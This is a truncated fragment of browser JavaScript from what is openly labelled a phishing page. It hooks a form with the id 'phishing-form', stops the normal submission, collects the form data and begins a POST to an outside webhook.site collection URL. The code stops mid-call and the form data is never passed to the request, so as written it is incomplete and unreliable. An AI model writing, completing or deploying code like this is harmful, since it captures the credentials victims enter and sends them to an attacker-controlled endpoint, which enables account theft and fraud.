  <script>
    const form = document.getElementById('phishing-form');
    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const formData = new FormData(form);
      fetch("https://webhook.site/38a6b839-ffc5-4c9d-9969-f4a93a7d128b", {
        method: "POST",

      }).then(() => {
